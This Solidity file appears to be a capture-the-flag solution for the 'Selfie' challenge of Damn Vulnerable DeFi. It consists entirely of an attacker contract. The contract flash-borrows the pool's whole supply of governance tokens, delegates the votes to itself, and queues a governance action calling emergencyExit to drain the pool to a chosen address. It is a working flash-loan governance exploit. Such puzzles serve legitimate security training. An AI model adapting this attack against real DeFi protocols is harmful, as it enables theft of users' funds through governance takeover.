// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SelfiePool} from "../SelfiePool.sol";
import {DamnValuableVotes} from "../../DamnValuableVotes.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {console} from "forge-std/console.sol";
import {SimpleGovernance} from "../SimpleGovernance.sol";

contract AttackSelfiePool is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    SelfiePool public immutable selfiePool;
    DamnValuableVotes public immutable votesToken;
    SimpleGovernance public immutable governance;
    uint256 private targetActionId;

    constructor(address _pool, address _token, address _governance) {
        selfiePool = SelfiePool(_pool);
        votesToken = DamnValuableVotes(_token);
        governance = SimpleGovernance(_governance);
    }

    function attack(address recovery) public returns (uint256) {
        uint256 amountToBorrow = votesToken.balanceOf(address(selfiePool));
        selfiePool.flashLoan(this, address(votesToken), amountToBorrow, abi.encode(recovery));

        return targetActionId;
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        votesToken.delegate(address(this));
        console.log("Votes in the middle of the attack ", votesToken.getVotes(address(this)));
        address recovery = abi.decode(data, (address));
        targetActionId = governance.getActionCounter();
        governance.queueAction(
            address(selfiePool), 0, abi.encodeWithSelector(SelfiePool.emergencyExit.selector, recovery)
        );
        votesToken.approve(address(selfiePool), amount);
        return CALLBACK_SUCCESS;
    }
}
